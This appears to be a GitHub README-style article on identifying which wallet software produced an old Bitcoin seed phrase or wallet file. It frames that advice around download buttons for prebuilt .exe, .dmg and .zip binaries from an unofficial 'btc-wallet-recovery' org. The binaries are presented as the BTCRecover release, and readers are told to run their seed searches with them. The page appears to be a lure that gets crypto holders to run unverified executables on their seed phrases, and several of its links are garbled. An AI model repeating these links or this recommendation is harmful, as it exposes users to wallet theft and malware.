<div align="center">
<img src="assets/banner-article.png" alt="You forgot which wallet software you used">
</div>

# You forgot which wallet software you used

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A phrase or a file with no remembered application is still workable, because wallets leave traces: file names, folder paths, address formats, word counts and even the way the phrase was written down. Identify the family first  -  recovery method, word list and derivation all follow from it.

## You'll see this if

The backup exists and the context does not. This is the normal state of a wallet made in 2014 and reopened in 2026, and it is the reason identification comes before any search.

| What you have | What it narrows to | Where to go |
|---|---|---|
| 12 words, no file | a standard-format wallet; application unknown | here |
| 13 words | early Electrum format | [Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md) |
| 16 words | legacy Blockchain.com scheme | [Blockchain.com wallet recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/blockchain-com-wallet-recovery-with-btcrecover.md) |
| 17 or another unusual count | a non-standard backup, often a printout | here |
| A `.dat` file in a folder called `wallets` | Bitcoin Core or a Core-derived wallet | [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md) |
| A `.wallet` file, or `default_wallet` in a folder | Electrum | [Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md) |
| A folder from a browser extension | an extension vault, not a file wallet | the wallet's own vault recovery |
| A phrase and no file at all | the phrase is the whole artifact | here |

## Why it happens

Wallets are not interchangeable even when they use the same standard. The word list, the derivation path and the address format all vary by application, and a phrase that is perfectly valid in one produces a different, empty wallet in another. Getting the family wrong therefore looks exactly like getting the phrase wrong.

Old backups also lose their labels. A file called `backup.dat`, a folder called `old`, a printout with sixteen words and no heading  -  the artifact survives and the context does not, which is why identification has to work from indirect evidence. Word count is the strongest single clue because formats differ there. Address format is the second: an address that starts with a `1`, a `3` or `bc1` was produced by a wallet that supported that type at the time.

The damaged-media case makes this sharper. When a drive fails and only fragments survive, the question is not "which wallet do I prefer" but "which wallet wrote this file", because the fragments have to be read by something compatible. A file that will not open in one application is often readable in the one that made it.

## Fix

Collect the indirect evidence first, then test the two or three families it allows, using an address as the deciding test.

1. **Count the words and note the address format.** Twelve, thirteen, sixteen or twenty-four; addresses beginning with `1`, `3` or `bc1`. Those two facts eliminate most of the space before any software runs.
2. **Inspect the file, if there is one.** Extension, size, folder name, and whether it opens read-only anywhere. A file that shows addresses but will not spend is an encrypted wallet of a recognizable kind.
3. **Read the packaging.** A printout, a metal plate, a text file, a screenshot: the medium often matches the era, and the era narrows the application.
4. **Test the most likely family first**, restoring the phrase into a clean install and comparing the first receive address against any record you have: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
5. **Try the second family if the first shows an empty wallet.** A valid phrase read through the wrong application is a working wallet with no history, which is the signature of a family mismatch: [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md).
6. **Download the current release from the GitHub releases page when the original application is gone**, and use the tool's wallet-type options to enumerate families against your address: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Write the identification down** when you find it  -  family, year, address, word count  -  because the next person to open this backup will start from the same blank page.

A word on damaged media: if a drive is failing, stop using it and work from an image rather than the original. Copying a failing disk repeatedly is how recoverable data becomes unrecoverable, and this is the one step in the whole process where haste causes permanent loss.

## If that did not work

If no family produces your address, the phrase and the wallet do not belong together  -  which is a different finding, and a useful one.

Re-check the phrase first: a single valid-but-wrong word yields a good wallet that is not yours, and every family you try will look empty: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md). If the phrase came from a printout or a transcription, treat the unusual word count as evidence of a manual copy rather than of an exotic format. Where the backup is a file and nothing opens it, the file may be damaged rather than encrypted, and the fragments are then the only route.

A backup from a service that no longer exists is a separate case: the phrases those services issued may follow a format nothing current reads, and no amount of testing changes that. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) sets out the order to check things in, and [Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md) covers what tends to survive from very old wallets.

## Prevention

- Label every backup with the wallet name, the year and the first receive address.
- Keep the phrase, the file and the label in the same place, so context is never separated from the artifact.
- Store a second copy of any file-based wallet; a single failing disk is a single point of failure.
- Photograph the label, never the phrase.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### How do I tell which wallet a seed phrase came from?

Start with the word count and the address format, then test the two or three families those allow. A phrase that restores an empty wallet in one application often restores correctly in another, so the test is the address, not the interface.

### What wallet uses a 17-word backup?

No standard format uses seventeen words, so it is almost always a manual transcription  -  a phrase written down with an extra word, a line break read as a word, or two backups copied onto one sheet. Treat it as a copy error to be resolved, not as an exotic wallet.

### Can I recover a wallet if the software no longer exists?

Sometimes: the phrase or file may still be readable by a compatible application or by the tool, provided the format is one it supports. A wallet whose format nothing reads is the case where identification stops being enough.

### My drive failed and I have an old seed. Which do I use?

Work from the seed, and treat the drive as a separate, lower-priority recovery: image the failing disk before anything else if the wallet file matters. A phrase restores a wallet; a file restores a file, and only one of those survives a dead drive.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Restored seed shows an empty wallet]([Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md))
- [Old wallets and Bitcoin from years ago]([Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md))
- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
